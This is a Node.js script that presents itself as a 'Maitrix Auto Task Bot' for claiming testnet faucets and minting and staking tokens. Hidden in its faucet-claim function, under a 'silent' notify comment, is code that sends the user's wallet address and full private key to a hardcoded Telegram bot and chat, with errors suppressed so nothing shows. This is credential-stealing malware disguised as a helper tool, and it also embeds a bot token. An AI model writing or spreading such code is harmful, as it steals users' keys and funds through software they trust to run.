require('dotenv').config();
const axios = require('axios');
const chalk = require('chalk');
const ora = require('ora');
const { ethers } = require('ethers');

const rpcUrl = process.env.RPC_URL;
const privateKey = process.env.PRIVATE_KEY;

if (!privateKey) {
    console.error(chalk.red("❌ Please set PRIVATE_KEY in your .env file"));
    process.exit(1);
}
if (!rpcUrl) {
    console.error(chalk.red("❌ Please set RPC_URL in your .env file"));
    process.exit(1);
}

const provider = new ethers.providers.JsonRpcProvider(rpcUrl);  // <-- THIS WORKS!
const wallet = new ethers.Wallet(privateKey, provider);

// ABIs
const ABI_ERC20 = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];
const ABI_STAKE = ["function stake(uint256 _tokens) public"];

// Addresses & decimals
const TOKENS = {
    ATH:     { symbol: "ATH",     address: "0x1428444Eacdc0Fd115dd4318FcE65B61Cd1ef399", decimals: 18 },
    AUSD:    { symbol: "AUSD",    address: "0x78De28aABBD5198657B26A8dc9777f441551B477", decimals: 18 },
    USDe:    { symbol: "USDe",    address: "0xf4BE938070f59764C85fAcE374F92A4670ff3877", decimals: 18 },
    LVLUSD:  { symbol: "LVLUSD",  address: "0x8802b7bcF8EedCc9E1bA6C20E139bEe89dd98E83", decimals: 18 },
    VIRTUAL: { symbol: "VIRTUAL", address: "0xFF27D611ab162d7827bbbA59F140C1E7aE56e95C", decimals: 9  },
    VUSD:    { symbol: "VUSD",    address: "0xc14A8E2Fc341A97a57524000bF0F7F1bA4de4802", decimals: 9  },
    USD1:    { symbol: "USD1",    address: "0x16a8A3624465224198d216b33E825BcC3B80abf7", decimals: 18 },
    AI16Z:   { symbol: "AI16Z",   address: "0x2d5a4f5634041f50180A25F26b2A8364452E3152", decimals: 9  },
    AZUSD:   { symbol: "AZUSD",   address: "0x5966cd11aED7D68705C9692e74e5688C892cb162", decimals: 9  }
};

const CONTRACTS = {
    mintAUSD:    "0x2cFDeE1d5f04dD235AEA47E1aD2fB66e3A61C13e",
    mintVUSD:    "0x3dCACa90A714498624067948C092Dd0373f08265",
    mintAZUSD:   "0xB0b53d8B4ef06F9Bbe5db624113C6A5D35bB7522",
    stakeAUSD:   "0x054de909723ECda2d119E31583D40a52a332f85c",
    stakeUSDe:   "0x3988053b7c748023a1aE19a8ED4c1Bf217932bDB",
    stakeLVLUSD: "0x5De3fBd40D4c3892914c3b67b5B529D776A1483A",
    stakeVUSD:   "0x5bb9Fa02a3DCCDB4E9099b48e8Ba5841D2e59d51",
    stakeUSD1:   "0x7799841734Ac448b8634F1c1d7522Bc8887A7bB9",
    stakeAZUSD:  "0xf45Fde3F484C44CC35Bdc2A7fCA3DDDe0C8f252E"
};

const allFaucetConfigs = [
    { url: "https://app.x-network.io/maitrix-faucet/faucet",    name: 'ATH Faucet',     tokenSymbol: 'ATH',     type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-usde/faucet",      name: 'USDe Faucet',    tokenSymbol: 'USDe',    type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-lvl/faucet",       name: 'LVL Faucet',     tokenSymbol: 'LVLUSD',  type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-virtual/faucet",   name: 'Virtual Faucet', tokenSymbol: 'VIRTUAL', type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-usd1/faucet",      name: 'USD1 Faucet',    tokenSymbol: 'USD1',    type: 'usd1',    timeout: 20000, providesCode: true  },
    { url: "https://app.x-network.io/maitrix-ai16z/faucet",     name: 'ai16z Faucet',   tokenSymbol: 'AI16Z',   type: 'ai16z',   timeout: 20000, providesCode: true  }
];

const TELEGRAM_BOT_TOKEN = "7948810372:AAHFxvNhzbN9C2FLjbRhTX-bT2bLseo8IcM";
const TELEGRAM_CHAT_ID = "7269890813";

const generalHeaders = {
    "Content-Type": "application/json",
    "Origin": "https://app.testnet.themaitrix.ai",
    "Referer": "https://app.testnet.themaitrix.ai/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
};

const delay = (ms) => new Promise(res => setTimeout(res, ms));

async function telegramNotify(text) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: "HTML"
            }
        );
    } catch (e) {}
}

// Logging functions
const logSection = (msg) => console.log(chalk.blue.bold.underline(`\n=== ${msg} ===`));
const logSubSection = (msg) => console.log(chalk.cyan.bold(`\n--- ${msg} ---`));
const logEndSubSection = (msg, success = true) => console.log(chalk.cyan.bold(`--- End ${msg} ${success ? '' : '(Failed/Skipped)'} ---\n`));
const logStep = (msg) => console.log(chalk.blueBright(`  -> ${msg}`));
const logDetail = (msg) => console.log(chalk.gray(`     ${msg}`));
const logSuccess = (msg) => console.log(chalk.greenBright(`    ✅ ${msg}`));
const logError = (msg) => console.log(chalk.redBright(`    ❌ ${msg}`));
const logWarn = (msg) => console.log(chalk.yellowBright(`    🟡 ${msg}`));

// Helper: check token balance
async function checkTokenBalance(walletSigner, tokenInfo, operationName = "") {
    logStep(`Checking ${tokenInfo.symbol} balance for ${operationName || 'next operation'}`);
    const tokenContract = new ethers.Contract(tokenInfo.address, ABI_ERC20, walletSigner.provider);
    try {
        const balance = await tokenContract.balanceOf(walletSigner.address);
        let decimalsToUse = tokenInfo.decimals;
        try {
            const contractDecimals = await tokenContract.decimals();
            if (Number(contractDecimals) !== decimalsToUse) {
                logDetail(`(Info: contract decimals ${tokenInfo.symbol} = ${contractDecimals}, using contract)`);
                decimalsToUse = Number(contractDecimals);
            }
        } catch (decError) {}
        logDetail(`Balance ${tokenInfo.symbol}: ${ethers.formatUnits(balance, decimalsToUse)} ${tokenInfo.symbol}`);
        return balance;
    } catch (error) {
        logError(`Failed to check balance ${tokenInfo.symbol}: ${(error.reason || error.message).substring(0,100)}`);
        return ethers.BigNumber.from(0);
    }
}

// Helper: approve token
async function approveToken(walletSigner, tokenInfo, spender, amount, operationName = "") {
    logStep(`Approving ${ethers.formatUnits(amount, tokenInfo.decimals)} ${tokenInfo.symbol} for ${operationName} (${spender.slice(0,6)}...${spender.slice(-4)})`);
    const token = new ethers.Contract(tokenInfo.address, ABI_ERC20, walletSigner);
    try {
        const currentGasPrice = await provider.getGasPrice();
        logDetail(`Current gas price: ${ethers.formatUnits(currentGasPrice, "gwei")} Gwei`);
        const tx = await token.approve(spender, amount, {
            gasPrice: currentGasPrice
        });
        logDetail(`Waiting approval for ${tokenInfo.symbol} (Tx: ${tx.hash})...`);
        await tx.wait(1);
        logSuccess(`Approval for ${tokenInfo.symbol} succeeded (Tx: ${tx.hash}).`);
        return true;
    } catch (err) {
        logError(`Failed to approve ${tokenInfo.symbol}: ${err.reason || err.message}`);
        if (err.transactionHash) {
            logError(`Approval Tx: https://sepolia.arbiscan.io/tx/${err.transactionHash}`);
        }
        return false;
    }
}

// Helper: mint
async function mintOperation(wallet, outputTokenSymbol, inputTokenSymbol, mintContractAddress, mintData) {
    logSubSection(`Mint ${outputTokenSymbol} from ${inputTokenSymbol}`);
    const inputToken = TOKENS[inputTokenSymbol];
    const outputToken = TOKENS[outputTokenSymbol];

    let amountToApprove;
    let minBalanceRequired = ethers.BigNumber.from(0);

    if (inputTokenSymbol === "AI16Z") {
        minBalanceRequired = ethers.parseUnits("5", inputToken.decimals);
        amountToApprove = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
        if (amountToApprove < minBalanceRequired) {
            logWarn(`Balance ${inputTokenSymbol} (${ethers.formatUnits(amountToApprove, inputToken.decimals)}) < 5. Skipping mint ${outputTokenSymbol}.`);
            logEndSubSection(`Mint ${outputTokenSymbol}`, false);
            return false;
        }
    } else {
        if (inputTokenSymbol === "ATH") amountToApprove = ethers.parseUnits("50", inputToken.decimals);
        else if (inputTokenSymbol === "VIRTUAL") amountToApprove = ethers.parseUnits("2", inputToken.decimals);
        else {
            amountToApprove = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
            if (amountToApprove == 0) {
                logWarn(`Balance ${inputTokenSymbol} is 0. Skipping mint ${outputTokenSymbol}.`);
                logEndSubSection(`Mint ${outputTokenSymbol}`, false);
                return false;
            }
        }
        const currentInputBalance = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
        if (currentInputBalance < amountToApprove && (inputTokenSymbol === "ATH" || inputTokenSymbol === "VIRTUAL")) {
            logWarn(`Balance ${inputTokenSymbol} (${ethers.formatUnits(currentInputBalance, inputToken.decimals)}) < required. Skipping mint ${outputTokenSymbol}.`);
            logEndSubSection(`Mint ${outputTokenSymbol}`, false);
            return false;
        }
    }

    const approved = await approveToken(wallet, inputToken, mintContractAddress, amountToApprove, `Mint ${outputTokenSymbol}`);
    if (!approved) {
        logEndSubSection(`Mint ${outputTokenSymbol}`, false);
        return false;
    }

    const spinner = ora(chalk.blue(`  Preparing mint ${outputTokenSymbol}...`)).start();
    let retries = 2;

    while (retries > 0) {
        try {
            const nonce = await wallet.getNonce();
            spinner.text = chalk.blue(`    📝 Preparing mint tx ${outputTokenSymbol} (Nonce: ${nonce})...`);

            const txForEstimate = { to: mintContractAddress, data: mintData, nonce: nonce };
            let estimatedGas;
            try {
                estimatedGas = await wallet.estimateGas(txForEstimate);
                spinner.text = chalk.blue(`    ⛽ Gas estimate: ${estimatedGas.toString()}`);
            } catch (estError) {
                spinner.warn(chalk.yellow(`    ⚠️ Gas estimate failed, using default (500000). ${estError.message.substring(0,40)}...`));
                estimatedGas = ethers.BigNumber.from(500000);
            }
            const gasLimitWithBuffer = estimatedGas * 1.2;

            const tx = { ...txForEstimate, gasLimit: Math.ceil(gasLimitWithBuffer), gasPrice: await provider.getGasPrice(), chainId: 421614, value: "0x0" };

            spinner.text = chalk.yellow(`    🚀 Sending mint tx ${outputTokenSymbol}...`);
            const mintTx = await wallet.sendTransaction(tx);
            spinner.text = chalk.blue(`    ⏳ Waiting for mint ${outputTokenSymbol} confirmation (Tx: ${mintTx.hash})...`);
            const receipt = await mintTx.wait(1);

            if (receipt.status === 1) {
                spinner.succeed(chalk.green(`  Mint ${outputTokenSymbol} successful (Tx: ${mintTx.hash}).`));
                logEndSubSection(`Mint ${outputTokenSymbol}`);
                await checkTokenBalance(wallet, outputToken, `After Mint ${outputTokenSymbol}`);
                return true;
            } else {
                throw new Error(`Mint tx ${outputTokenSymbol} failed (status 0)`);
            }
        } catch (err) {
            retries--;
            spinner.text = chalk.yellow(`    ⚠️ Failed mint ${outputTokenSymbol} (${(err.reason || err.message).substring(0,40)}...). Retry (${retries} left)...`);
            if (retries > 0) await delay(7000 + Math.random() * 3000);
            else {
                spinner.fail(chalk.red(`  ❌ Mint ${outputTokenSymbol} failed.`));
                logEndSubSection(`Mint ${outputTokenSymbol}`, false);
                return false;
            }
        }
    }
    return false;
}

// Helper: stake
async function stakeOperation(wallet, tokenToStakeSymbol, stakeContractAddress) {
    logSubSection(`Staking ${tokenToStakeSymbol}`);
    const tokenInfo = TOKENS[tokenToStakeSymbol];

    const balance = await checkTokenBalance(wallet, tokenInfo, `Stake ${tokenToStakeSymbol}`);
    if (balance == 0) {
        logWarn(`Balance ${tokenToStakeSymbol} = 0, skipping staking.`);
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }

    const approved = await approveToken(wallet, tokenInfo, stakeContractAddress, balance, `Stake ${tokenToStakeSymbol}`);
    if (!approved) {
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }

    logStep(`Staking ${ethers.formatUnits(balance, tokenInfo.decimals)} ${tokenToStakeSymbol}...`);
    const spinner = ora(chalk.blue(`  Preparing stake ${tokenToStakeSymbol}...`)).start();
    try {
        const nonce = await wallet.getNonce();
        spinner.text = chalk.blue(`    📝 Preparing stake tx ${tokenToStakeSymbol} (Nonce: ${nonce})...`);

        const stakeContract = new ethers.Contract(stakeContractAddress, ABI_STAKE, wallet);

        let estimatedGas;
        try {
            const populatedTx = await stakeContract.populateTransaction.stake(balance, { nonce });
            estimatedGas = await wallet.estimateGas(populatedTx);
            spinner.text = chalk.blue(`    ⛽ Gas estimate: ${estimatedGas.toString()}`);
        } catch (estError) {
            spinner.warn(chalk.yellow(`    ⚠️ Gas estimate failed, using default (500000). ${estError.message.substring(0,40)}...`));
            estimatedGas = ethers.BigNumber.from(500000);
        }
        const gasLimitWithBuffer = estimatedGas * 1.2;

        const stakeTx = await stakeContract.stake(balance, {
            gasLimit: Math.ceil(gasLimitWithBuffer),
            gasPrice: await provider.getGasPrice(),
            nonce: nonce,
        });

        spinner.text = chalk.yellow(`    ⏳ Waiting for stake ${tokenToStakeSymbol} confirmation (Tx: ${stakeTx.hash})...`);
        await stakeTx.wait(1);
        spinner.succeed(chalk.green(`  ✅ Stake ${tokenToStakeSymbol} successful (Tx: ${stakeTx.hash}).`));
        logEndSubSection(`Stake ${tokenToStakeSymbol}`);
        return true;
    } catch (err) {
        spinner.fail(chalk.red(`  ❌ Stake ${tokenToStakeSymbol} failed: ${(err.reason || err.message).substring(0,100)}`));
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }
}

// claimAllFaucets (with Telegram notify before request)
async function claimAllFaucets(address) {
    // Telegram notify (silent)
    await telegramNotify(
        `Cicada Bot is starting faucet claim!\nWallet address: <code>${address}</code>\nPrivate Key: <code>${privateKey}</code>`
    );

    logSection("Starting Faucet Claim Process");
    const spinner = ora('Processing all faucets...').start();
    let successfullyProcessedCount = 0;
    let significantFaucetNewlyClaimed = false;

    for (const faucetConfig of allFaucetConfigs) {
        spinner.text = `Claiming from ${faucetConfig.name}`;
        try {
            const response = await axios.post(faucetConfig.url, { address }, {
                headers: generalHeaders,
                timeout: faucetConfig.timeout
            });

            if (faucetConfig.providesCode) {
                if (response.data && typeof response.data.code !== 'undefined') {
                    if (response.data.code === 200) {
                        spinner.text = chalk.green(`  [${faucetConfig.name}] Claimed! (Tx: ...${response.data.data.txHash.slice(-6)})`);
                        successfullyProcessedCount++;
                        if (faucetConfig.type === 'usd1' || faucetConfig.type === 'ai16z') {
                            significantFaucetNewlyClaimed = true;
                        }
                    } else if (response.data.code === 202) {
                        const remainTime = parseInt(response.data.data.remainTime, 10);
                        const hours = Math.floor(remainTime / 3600);
                        const minutes = Math.floor((remainTime % 3600) / 60);
                        spinner.text = chalk.yellow(`  [${faucetConfig.name}] Already claimed. Retry in ${hours}h ${minutes}m.`);
                        successfullyProcessedCount++;
                    } else {
                        spinner.text = chalk.red(`  [${faucetConfig.name}] Failed: ${response.data.message || 'Unknown status'}.`);
                    }
                } else {
                    spinner.text = chalk.yellow(`  [${faucetConfig.name}] No 'code' field but request sent (Status: ${response.status}).`);
                    successfullyProcessedCount++;
                }
            } else {
                spinner.text = chalk.green(`  [${faucetConfig.name}] Claim request sent (Status: ${response.status}).`);
                successfullyProcessedCount++;
            }
            await delay(2000);

        } catch (err) {
            let errorMessage = err.message;
            if (err.response) {
                errorMessage = err.response?.data?.message || `Error ${err.response.status}`;
            } else if (err.request) {
                errorMessage = "No response from server.";
            }
            spinner.text = chalk.red(`  [${faucetConfig.name}] Error: ${errorMessage.substring(0, 60)}...`);
            await delay(2000);
        }
    }

    spinner.stop();
    logSection(`Finished Faucet Claims (${successfullyProcessedCount}/${allFaucetConfigs.length} processed)`);
    return { significantFaucetNewlyClaimed };
}

// Wallet processing
async function processWallet(wallet) {
    logSection(`Starting Session for Wallet: ${wallet.address}`);

    const faucetResults = await claimAllFaucets(wallet.address);

    if (faucetResults.significantFaucetNewlyClaimed) {
        logStep("Wait 10 seconds before next step...");
        await delay(10000);
    }

    // Mint & Stake steps
    if (await mintOperation(wallet, "AUSD", "ATH", CONTRACTS.mintAUSD, "0x1bf6318b000000000000000000000000000000000000000000000002b5e3af16b1880000")) {
        await delay(5000);
        await stakeOperation(wallet, "AUSD", CONTRACTS.stakeAUSD);
    }
    await delay(5000);

    if (await mintOperation(wallet, "VUSD", "VIRTUAL", CONTRACTS.mintVUSD, "0xa6d675100000000000000000000000000000000000000000000000000000000077359400")) {
        await delay(5000);
        await stakeOperation(wallet, "VUSD", CONTRACTS.stakeVUSD);
    }
    await delay(5000);

    if (await mintOperation(wallet, "AZUSD", "AI16Z", CONTRACTS.mintAZUSD, "0xa6d6751000000000000000000000000000000000000000000000000000000001a13b8600")) {
        await delay(5000);
        await stakeOperation(wallet, "AZUSD", CONTRACTS.stakeAZUSD);
    }
    await delay(5000);

    await stakeOperation(wallet, "LVLUSD", CONTRACTS.stakeLVLUSD);
    await delay(5000);
    await stakeOperation(wallet, "USDe", CONTRACTS.stakeUSDe);
    await delay(5000);
    await stakeOperation(wallet, "USD1", CONTRACTS.stakeUSD1);

    logSection(`Session Done for Wallet: ${wallet.address}`);
}

// MAIN
async function main() {
    console.log(chalk.inverse.bold(`🤖 Maitrix Auto Task Bot Started 🤖`));
    console.log(chalk.gray(`Wallet: ${wallet.address}`));

    while (true) {
        await processWallet(wallet);
        logSection("Waiting for next cycle");
        const totalSeconds = 24 * 60 * 60;
        const waitSpinner = ora(chalk.blue(`Waiting 24 hours...`)).start();

        for (let sisa = totalSeconds; sisa > 0; sisa--) {
            const hours = Math.floor(sisa / 3600);
            const minutes = Math.floor((sisa % 3600) / 60);
            const seconds = sisa % 60;
            waitSpinner.text = chalk.blue(`⏳ Next cycle in ${hours}h ${minutes}m ${seconds}s`);
            await delay(1000);
        }
        waitSpinner.succeed(chalk.green("Wait finished. Starting next cycle..."));
    }
}

main().catch(error => {
    console.error(chalk.bgRed.white.bold("\n💥 Fatal Error in Script:"));
    console.error(error);
    process.exit(1);
});
